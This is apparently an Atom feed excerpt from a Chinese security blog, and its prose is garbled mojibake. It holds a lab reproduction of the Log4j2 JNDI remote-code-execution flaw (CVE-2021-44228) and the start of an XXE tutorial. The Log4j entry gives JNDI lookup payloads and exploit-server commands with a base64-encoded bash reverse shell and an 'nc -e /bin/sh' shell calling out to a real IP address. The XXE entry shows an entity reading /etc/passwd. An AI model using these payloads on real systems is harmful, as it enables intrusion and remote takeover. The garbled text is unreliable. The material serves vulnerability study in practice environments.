    <title>log4j2çš„ç®€å•å¤ç°</title>
    <link href="https://sakurahack-y.github.io/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/"/>
    <id>https://sakurahack-y.github.io/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-04-23T14:46:44.000Z</published>
    <updated>2022-04-23T16:33:05.602Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰åªæ˜¯ç®€ç•¥çœ‹äº†çœ‹è¿™ä¸ªæ¼æ´ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰åŠæ—¶å¤ç°ï¼Œä½†æ˜¯å‘ç°è¿™ä¸ªæ¼æ´hwé—®çš„å¾ˆå¤šï¼Œæ‰€ä»¥è¿˜æ˜¯åŠæ—¶å¤ç°ä¸€ä¸‹å§ã€‚</p><h1 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h1><p><a href="https://logging.apache.org/log4j/2.x/index.html">Apache Log4j2</a> æ˜¯ Apache è½¯ä»¶åŸºé‡‘ä¼šä¸‹çš„ä¸€ä¸ª<a href="https://github.com/apache/logging-log4j2">å¼€æº</a>çš„åŸºäº Java çš„æ—¥å¿—è®°å½•å·¥å…·ã€‚Log4j2 æ˜¯ä¸€ä¸ª Log4j 1.x çš„é‡å†™ï¼Œå¹¶ä¸”å¼•å…¥äº†å¤§é‡ä¸°å¯Œçš„ç‰¹æ€§ã€‚è¯¥æ—¥å¿—æ¡†æ¶è¢«å¤§é‡ç”¨äºä¸šåŠ¡ç³»ç»Ÿå¼€å‘ï¼Œç”¨æ¥è®°å½•æ—¥å¿—ä¿¡æ¯ã€‚ç”±äºå…¶ä¼˜å¼‚çš„æ€§èƒ½è€Œè¢«å¹¿æ³›çš„åº”ç”¨äºå„ç§å¸¸è§çš„ Web æœåŠ¡ä¸­ã€‚</p><p>2021 å¹´ 12 æœˆ 9 æ—¥æ™šï¼ŒLog4j2 çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´çš„åˆ©ç”¨ç»†èŠ‚è¢«å…¬å¼€ã€‚æ”»å‡»è€…ä½¿ç”¨ <code>$&#123;&#125;</code> å…³é”®æ ‡è¯†ç¬¦è§¦å‘ JNDI æ³¨å…¥æ¼æ´ï¼Œå½“ç¨‹åºå°†ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œæ—¥å¿—è®°å½•æ—¶ï¼Œå³å¯è§¦å‘æ­¤æ¼æ´ï¼ŒæˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p>æ¼æ´ç¼–å·ï¼š<a href="https://www.cve.org/CVERecord?id=CVE-2021-44228">CVE-2021-44228</a></p><p>- æ¼æ´ï¼šLog4j2 çš„ JNDI åŠŸèƒ½ç‚¹æ— æ³•é˜²å¾¡æ¥è‡ªæ”»å‡»è€…çš„ ldap ä»¥åŠå…¶ä»–ç›¸å…³ç«¯ç‚¹çš„æ”»å‡»è¡Œä¸ºã€‚<br>- ä¸¥é‡ç­‰çº§ï¼šCritical<br>- Basic CVSS è¯„åˆ†ï¼š10.0 CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H<br>- å½±å“ç‰ˆæœ¬ï¼šall versions from 2.0-beta9 to 2.14.1</p><h1 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h1><p>ç”±äºæœ¬äººä»£ç åŠŸåº•æœ‰é™ï¼Œå°±å¤§æ¦‚è¯´æ˜ä¸‹ï¼Œä¸è¿›è¡Œä»£ç è·Ÿè¿›äº†ã€‚</p><p>log4j2æä¾›äº†ä¸€ç§å«<code>lookups</code>çš„åŠŸèƒ½æ¥å†™æ—¥å¿—</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/webp.webp" alt="img"></p><p>è€Œæ¼æ´æˆå› å°±æ˜¯log4j2æ”¯æŒ<code>Jndi Lookup</code></p><p>æ—¥å¿—ä¸­åŒ…å« <code>$&#123;&#125;</code>,lookupåŠŸèƒ½å°±ä¼šå°†è¡¨è¾¾å¼çš„å†…å®¹æ›¿æ¢ä¸ºè¡¨è¾¾å¼è§£æåçš„å†…å®¹ï¼Œè€Œä¸æ˜¯è¡¨è¾¾å¼æœ¬èº«ã€‚log4j 2å°†åŸºæœ¬çš„è§£æéƒ½åšäº†å®ç°ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/27307869-0dd3def6ff8e3f96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/976/format/webp" alt="img"></p><p>å¸¸è§è§£æï¼š</p><pre><code>$&#123;ctx:loginId&#125;$&#123;map:type&#125;$&#123;filename&#125;$&#123;date:MM-dd-yyyy&#125;$&#123;docker:containerId&#125;$&#123;docker:containerName&#125;$&#123;docker:imageName&#125;$&#123;env:USER&#125;$&#123;event:Marker&#125;$&#123;mdc:UserId&#125;$&#123;java&#125;$&#123;jndi:logging/context-name&#125;$&#123;hostName&#125;$&#123;docker:containerId&#125;$&#123;k8s&#125;$&#123;log4j&#125;$&#123;main&#125;$&#123;name&#125;$&#123;marker&#125;$&#123;spring&#125;$&#123;sys:logPath&#125;$&#123;web:rootDir&#125;</code></pre><p>JNDIå°±æ˜¯æä¾›ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå¹¶å°†æœåŠ¡ä¸å¯¹è±¡å…³è”èµ·æ¥ï¼Œå¯ä»¥ä½¿ç”¨åç§°æ¥è®¿é—®å¯¹è±¡ã€‚è€Œlog4j 2ä¸­JNDIè§£ææœªä½œé™åˆ¶ï¼Œå¯ä»¥ç›´æ¥è®¿é—®åˆ°è¿œç¨‹å¯¹è±¡,å¦‚æœæ˜¯è‡ªå·±çš„æœåŠ¡å™¨è¿˜å¥½è¯´ï¼Œé‚£å¦‚æœè®¿é—®åˆ°é»‘å®¢çš„æœåŠ¡å™¨å‘¢ï¼Ÿ</p><p>ä¹Ÿå°±æ˜¯å½“è®°å½•æ—¥å¿—çš„ä¸€éƒ¨åˆ†æ˜¯ç”¨æˆ·å¯æ§æ—¶(æ¯”å¦‚è¾“å…¥ç”¨æˆ·åå’Œå¯†ç æ—¶)ï¼Œå°±å¯ä»¥æ„é€ æ¶æ„å­—ç¬¦ä¸²ä½¿æœåŠ¡å™¨è®°å½•æ—¥å¿—æ—¶è°ƒç”¨JNDIè®¿é—®æ¶æ„å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯æµä¼ å‡ºçš„payloadæ„æˆï¼š</p><p>${jndi:ldap:xxx.xxx.xxx.xxx:xxxx/exp}</p><h1 id="å¤ç°æµç¨‹"><a href="#å¤ç°æµç¨‹" class="headerlink" title="å¤ç°æµç¨‹"></a>å¤ç°æµç¨‹</h1><p><strong>ç¯å¢ƒ1 å¤±è´¥</strong></p><p>ç¯å¢ƒ:<a href="http://vulfocus.io/">http://vulfocus.io/</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423225000889.png" alt="image-20220423225000889"></p><p>æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨log4j2,ä½¿ç”¨ç½‘ç«™:<a href="http://dnslog.cn/">http://dnslog.cn/</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423230017138.png" alt="image-20220423230017138"></p><pre><code>xxxx?payload=$&#123;jndi:ldap://37zwcc.dnslog.cn/exp&#125;</code></pre><p>æœ‰ä¸ªå¾ˆé‡è¦ä¸€ç‚¹ï¼Œè¦å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œurlç¼–ç </p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423225440706.png" alt="image-20220423225440706"></p><p>æˆåŠŸå›æ˜¾ï¼Œè¯æ˜æœ‰æ¼æ´</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423230128737.png" alt="image-20220423230128737"></p><p>åœ¨vpsä¸Šè¿è¡Œjndiæ³¨å…¥å·¥å…·:</p><p>é“¾æ¥:<a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423230550825.png" alt="image-20220423230550825"></p><pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDguMTY2LjIwMS4xNi82NjY3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;108.166.xx.xx&quot;</code></pre><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423231525347.png" alt="image-20220423231525347"></p><p>ncç›‘å¬:</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423231620210.png" alt="image-20220423231620210"></p><p>æ„é€ payload</p><pre><code>$&#123;jndi:rmi://108.166.201.16:1099/xodh7q&#125;</code></pre><p>è¿˜æ˜¯è¿›è¡Œurlç¼–ç </p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000703924.png" alt="image-20220424000703924"></p><p>æŒ‰ç†è¯´å°±å¯ä»¥äº†ï¼Œä½†æ˜¯æˆ‘åœ¨è¿™ä¸ªç¯å¢ƒå¹¶æ²¡æœ‰æˆåŠŸ</p><p><strong>ç¯å¢ƒ2 æˆåŠŸ</strong></p><p>æ„Ÿè§‰ä¸Šé¢çš„ç¯å¢ƒæœ‰ç‚¹é—®é¢˜ï¼Œä¸€ç›´æ— æ³•åå¼¹shellï¼Œæ— è®ºæ˜¯bin/bash è¿˜æ˜¯ncéƒ½åå¼¹å¤±è´¥äº†ï¼Œä¸‹é¢é‡‡ç”¨bugkuç¯å¢ƒå¤ç°</p><p>url:<a href="https://ctf.bugku.com/challenges/detail/id/340.html">https://ctf.bugku.com/challenges/detail/id/340.html</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000909413.png" alt="image-20220424000909413"></p><p>æ‰“ä¸€ä¸‹pocï¼Œæµ‹è¯•ä¸‹æ˜¯å¦å­˜åœ¨æ¼æ´</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424001013346.png" alt="image-20220424001013346"></p><p>ojbkï¼Œå›æ˜¾äº†</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424001036572.png" alt="image-20220424001036572"></p><p>åœ¨Linuxä¸Šå¯åŠ¨æœåŠ¡</p><pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;nc 108.166.xx.xx 4444 -e /bin/sh&quot; -A 108.166.xx.xx</code></pre><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424001128315.png" alt="image-20220424001128315"></p><p>ç›´æ¥æ„é€ payload</p><pre><code>$&#123;jndi:rmi://108.166.201.16:1099/dwqsay&#125;</code></pre><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000441276.png" alt="image-20220424000441276"></p><p>æˆåŠŸåå¼¹shell</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000428361.png" alt="image-20220424000428361"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¹‹å‰åªæ˜¯ç®€ç•¥çœ‹äº†çœ‹è¿™ä¸ªæ¼æ´ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰åŠæ—¶å¤ç°ï¼Œä½†æ˜¯å‘ç°è¿™ä¸ªæ¼æ´hwé—®çš„å¾ˆå¤šï¼Œæ‰€ä»¥è¿˜æ˜¯åŠæ—¶å¤ç°ä¸€ä¸‹å§ã€‚&lt;/p&gt;
&lt;h1 id=&quot;æ¼æ´æè¿°&quot;&gt;&lt;a href=&quot;#æ¼æ´æè¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´æè¿°&quot;&gt;&lt;/a&gt;æ¼æ´æè¿°&lt;/h1&gt;&lt;p&gt;&lt;a </summary>
      
    
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´å¤ç°" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="log4j2" scheme="https://sakurahack-y.github.io/tags/log4j2/"/>
    
  </entry>
  
  <entry>
    <title>XXEæ¼æ´å­¦ä¹ </title>
    <link href="https://sakurahack-y.github.io/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>https://sakurahack-y.github.io/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-04-19T15:00:37.000Z</published>
    <updated>2022-04-21T19:18:52.365Z</updated>
    
    <content type="html"><![CDATA[<p>è‡ªå·±å¯¹è¿™ä¸ªæ¼æ´ä¸æ‡‚åŸç†ï¼Œä»¥åŠä¸ä¼šæ·±å…¥åˆ©ç”¨ï¼Œå°±çœ‹çœ‹å¸ˆå‚…çš„æ–‡ç« ï¼Œæ¬è¿é¡ºä¾¿å¤ç°éƒ¨åˆ†åœºæ™¯å§ã€‚</p><p>[TOC]</p><h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><p><strong>ä»€ä¹ˆæ˜¯XML</strong></p><p> XML æŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆEXtensible Markup Languageï¼‰ã€‚<br> XML çš„è®¾è®¡å®—æ—¨æ˜¯ä¼ è¾“æ•°æ®ï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºæ•°æ®ã€‚<br> XML æ˜¯ W3C çš„æ¨èæ ‡å‡†ã€‚<br> XML ä¸ä¼šåšä»»ä½•äº‹æƒ…ã€‚XML è¢«è®¾è®¡ç”¨æ¥ç»“æ„åŒ–ã€å­˜å‚¨ä»¥åŠä¼ è¾“ä¿¡æ¯ã€‚<br> XML è¯­è¨€æ²¡æœ‰é¢„å®šä¹‰çš„æ ‡ç­¾ã€‚</p><p><strong>XMLå’ŒHTMLçš„åŒºåˆ«</strong></p><p> XML è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚<br> HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ã€‚<br> HTML æ—¨åœ¨æ˜¾ç¤ºä¿¡æ¯ï¼Œè€Œ XML æ—¨åœ¨ä¼ è¾“ä¿¡æ¯ã€‚</p><p><strong>XMLè¢«ç”¨æ¥åšä»€ä¹ˆ</strong></p><p>ç°å®ç”Ÿæ´»ä¸­ä¸€äº›æ•°æ®ä¹‹é—´å¾€å¾€å­˜åœ¨ä¸€å®šçš„å…³ç³»ã€‚æˆ‘ä»¬å¸Œæœ›èƒ½åœ¨è®¡ç®—æœºä¸­ä¿å­˜å’Œå¤„ç†è¿™äº›æ•°æ®çš„åŒæ—¶èƒ½å¤Ÿä¿å­˜å’Œå¤„ç†ä»–ä»¬ä¹‹é—´çš„å…³ç³»ã€‚XMLå°±æ˜¯ä¸ºäº†è§£å†³è¿™æ ·çš„éœ€æ±‚è€Œäº§ç”Ÿæ•°æ®å­˜å‚¨æ ¼å¼ã€‚</p><p><strong>XMLåŸºæœ¬æ ¼å¼</strong></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xmlæ–‡ä»¶çš„å£°æ˜--&gt;&lt;bookstore&gt;                                                 &lt;!--æ ¹å…ƒç´ --&gt;&lt;book category=&quot;COOKING&quot;&gt;        &lt;!--bookstoreçš„å­å…ƒç´ ï¼Œcategoryä¸ºå±æ€§--&gt;&lt;title&gt;Everyday Italian&lt;/title&gt;           &lt;!--bookçš„å­å…ƒç´ ï¼Œlangä¸ºå±æ€§--&gt;&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--bookçš„å­å…ƒç´ --&gt;&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--bookçš„å­å…ƒç´ --&gt;&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--bookçš„å­å…ƒç´ --&gt;&lt;/book&gt;                                                 &lt;!--bookçš„ç»“æŸ--&gt;&lt;/bookstore&gt;                                       &lt;!--bookstoreçš„ç»“æŸ--&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt; ç§°ä¸º XML prolog ï¼Œç”¨äºå£°æ˜XMLæ–‡æ¡£çš„ç‰ˆæœ¬å’Œç¼–ç ï¼Œæ˜¯å¯é€‰çš„ï¼Œå¿…é¡»æ”¾åœ¨æ–‡æ¡£å¼€å¤´ã€‚standaloneå€¼æ˜¯yesçš„æ—¶å€™è¡¨ç¤ºDTDä»…ç”¨äºéªŒè¯æ–‡æ¡£ç»“æ„ï¼Œä»è€Œå¤–éƒ¨å®ä½“å°†è¢«ç¦ç”¨ï¼Œä½†å®ƒçš„é»˜è®¤å€¼æ˜¯noï¼Œè€Œä¸”æœ‰äº›parserä¼šç›´æ¥å¿½ç•¥è¿™ä¸€é¡¹ã€‚</code></pre><p><strong>åŸºæœ¬è¯­æ³•</strong></p><ul><li>æ‰€æœ‰ XML å…ƒç´ éƒ½é¡»æœ‰å…³é—­æ ‡ç­¾ã€‚</li><li>XML æ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿã€‚</li><li>XML å¿…é¡»æ­£ç¡®åœ°åµŒå¥—ã€‚</li><li>XML æ–‡æ¡£å¿…é¡»æœ‰æ ¹å…ƒç´ ã€‚</li><li>XML çš„å±æ€§å€¼é¡»åŠ å¼•å·ã€‚</li></ul><h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><p><strong>åŸºæœ¬æ¦‚å¿µ</strong></p><p> XML æ–‡æ¡£æœ‰è‡ªå·±çš„ä¸€ä¸ªæ ¼å¼è§„èŒƒï¼Œè¿™ä¸ªæ ¼å¼è§„èŒƒæ˜¯ç”±ä¸€ä¸ªå«åš DTDï¼ˆdocument type definitionï¼‰ çš„ä¸œè¥¿æ§åˆ¶çš„ã€‚<br> DTDç”¨æ¥ä¸ºXMLæ–‡æ¡£å®šä¹‰è¯­ä¹‰çº¦æŸã€‚å¯ä»¥åµŒå…¥åœ¨XMLæ–‡æ¡£ä¸­(å†…éƒ¨å£°æ˜)ï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹çš„æ”¾åœ¨å¦å¤–ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ä¸­(å¤–éƒ¨å¼•ç”¨)ã€‚æ˜¯XMLæ–‡æ¡£ä¸­çš„å‡ æ¡è¯­å¥ï¼Œç”¨æ¥è¯´æ˜å“ªäº›å…ƒç´ /å±æ€§æ˜¯åˆæ³•çš„ä»¥åŠå…ƒç´ é—´åº”å½“æ€æ ·åµŒå¥—/ç»“åˆï¼Œä¹Ÿç”¨æ¥å°†ä¸€äº›ç‰¹æ®Šå­—ç¬¦å’Œå¯å¤ç”¨ä»£ç æ®µè‡ªå®šä¹‰ä¸ºå®ä½“ã€‚</p><p><strong>å®ä½“å¼•ç”¨</strong></p><pre><code class="xml">XMLå…ƒç´ ä»¥å½¢å¦‚ &lt;tag&gt;foo&lt;/tag&gt; çš„æ ‡ç­¾å¼€å§‹å’Œç»“æŸï¼Œå¦‚æœå…ƒç´ å†…éƒ¨å‡ºç°å¦‚&lt; çš„ç‰¹æ®Šå­—ç¬¦ï¼Œè§£æå°±ä¼šå¤±è´¥ï¼Œä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼ŒXMLç”¨å®ä½“å¼•ç”¨ï¼ˆentity referenceï¼‰æ›¿æ¢ç‰¹æ®Šå­—ç¬¦ã€‚XMLé¢„å®šä¹‰äº”ä¸ªå®ä½“å¼•ç”¨ï¼Œå³ç”¨&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot; æ›¿æ¢ &lt; &gt; &amp; &#39; &quot; ã€‚å®ä½“å¼•ç”¨å¯ä»¥èµ·åˆ°ç±»ä¼¼å®å®šä¹‰å’Œæ–‡ä»¶åŒ…å«çš„æ•ˆæœï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬ä¼šå¸Œæœ›è‡ªå®šä¹‰å®ä½“å¼•ç”¨ï¼Œè¿™ä¸ªæ“ä½œåœ¨ç§°ä¸º Document Type Definationï¼ˆDTDï¼Œæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„è¿‡ç¨‹ä¸­è¿›è¡Œã€‚</code></pre><p><strong>ç¤ºä¾‹ä»£ç </strong></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;]&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;/to&gt;&lt;from&gt;@re&lt;/from&gt;&lt;head&gt;v3ry&lt;/head&gt;&lt;body&gt;g00d!&lt;/body&gt;&lt;/note&gt;PCDATAPCDATAçš„æ„æ€æ˜¯è¢«è§£æçš„å­—ç¬¦æ•°æ®ã€‚PCDATAæ˜¯ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚è¿™äº›æ–‡æœ¬å°†è¢«è§£æå™¨æ£€æŸ¥å®ä½“ä»¥åŠæ ‡è®°ã€‚æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¤„ç†ï¼Œè€Œå®ä½“ä¼šè¢«å±•å¼€ã€‚è¢«è§£æçš„å­—ç¬¦æ•°æ®ä¸åº”å½“åŒ…å«ä»»ä½•&amp;ï¼Œ&lt;ï¼Œæˆ–è€…&gt;å­—ç¬¦ï¼Œéœ€è¦ç”¨&amp;amp; &amp;lt; &amp;gt;å®ä½“æ¥åˆ†åˆ«æ›¿æ¢ã€‚CDATACDATAæ„æ€æ˜¯å­—ç¬¦æ•°æ®ï¼ŒCDATA æ˜¯ä¸ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ï¼Œåœ¨è¿™äº›æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¸ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¯¹å¾…ï¼Œå…¶ä¸­çš„å®ä½“ä¹Ÿä¸ä¼šè¢«å±•å¼€</code></pre><p><strong>DTDå…ƒç´ </strong></p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202150727-65e7882a-14d2-1.png" alt="img"></p><h1 id="DTDå®ä½“"><a href="#DTDå®ä½“" class="headerlink" title="DTDå®ä½“"></a>DTDå®ä½“</h1><blockquote><p> å®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ã€‚<br> å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚<br> å®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜ã€‚</p></blockquote><p><em>æŒ‰å®ä½“æœ‰æ— å‚åˆ†ç±»ï¼Œå®ä½“åˆ†ä¸ºä¸€èˆ¬å®ä½“å’Œå‚æ•°å®ä½“</em></p><pre><code class="xml">ä¸€èˆ¬å®ä½“çš„å£°æ˜ï¼š&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“å†…å®¹&quot;&gt;å¼•ç”¨ä¸€èˆ¬å®ä½“çš„æ–¹æ³•ï¼š&amp;å®ä½“åç§°;ç»å®éªŒï¼Œæ™®é€šå®ä½“å¯ä»¥åœ¨DTDä¸­å¼•ç”¨ï¼Œå¯ä»¥åœ¨XMLä¸­å¼•ç”¨ï¼Œå¯ä»¥åœ¨å£°æ˜å‰å¼•ç”¨ï¼Œè¿˜å¯ä»¥åœ¨å®ä½“å£°æ˜å†…éƒ¨å¼•ç”¨ã€‚å‚æ•°å®ä½“çš„å£°æ˜ï¼š&lt;!ENTITY % å®ä½“åç§° &quot;å®ä½“å†…å®¹&quot;&gt;å¼•ç”¨å‚æ•°å®ä½“çš„æ–¹æ³•ï¼š%å®ä½“åç§°;ç»å®éªŒï¼Œå‚æ•°å®ä½“åªèƒ½åœ¨DTDä¸­å¼•ç”¨ï¼Œä¸èƒ½åœ¨å£°æ˜å‰å¼•ç”¨ï¼Œä¹Ÿä¸èƒ½åœ¨å®ä½“å£°æ˜å†…éƒ¨å¼•ç”¨ã€‚</code></pre><p>DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ã€‚</p><p>æŒ‰å®ä½“ä½¿ç”¨æ–¹å¼åˆ†ç±»ï¼Œå®ä½“åˆ†ä¸ºå†…éƒ¨å£°æ˜å®ä½“å’Œå¼•ç”¨å¤–éƒ¨å®ä½“</p><p><strong>å†…éƒ¨å®ä½“</strong></p><pre><code class="xml">&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</code></pre><p><strong>å†…éƒ¨å®ä½“ç¤ºä¾‹ä»£ç ï¼š</strong></p><pre><code class="xml">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY writer &quot;Dawn&quot;&gt;    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;]&gt;&lt;test&gt;&amp;writer;Â©right;&lt;/test&gt;</code></pre><p><strong>å¤–éƒ¨å®ä½“</strong></p><p>å¤–éƒ¨å®ä½“ï¼Œç”¨æ¥å¼•å…¥å¤–éƒ¨èµ„æºã€‚æœ‰<code>SYSTEM</code>å’Œ<code>PUBLIC</code>ä¸¤ä¸ªå…³é”®å­—ï¼Œè¡¨ç¤ºå®ä½“æ¥è‡ªæœ¬åœ°è®¡ç®—æœºè¿˜æ˜¯å…¬å…±è®¡ç®—æœºã€‚</p><pre><code class="xml">&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI/URL&quot;&gt;æˆ–è€…&lt;!ENTITY å®ä½“åç§° PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></pre><p><strong>å¤–éƒ¨å®ä½“ç¤ºä¾‹ä»£ç :</strong></p><pre><code class="xml">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;    &lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;]&gt;&lt;author&gt;&amp;file;Â©right;&lt;/author&gt;</code></pre><p>å¤–éƒ¨å®ä½“å¯æ”¯æŒhttpã€fileç­‰åè®®ã€‚ä¸åŒç¨‹åºæ”¯æŒçš„åè®®ä¸åŒï¼š</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202150935-b26e4a30-14d2-1.png" alt="img"></p><p> 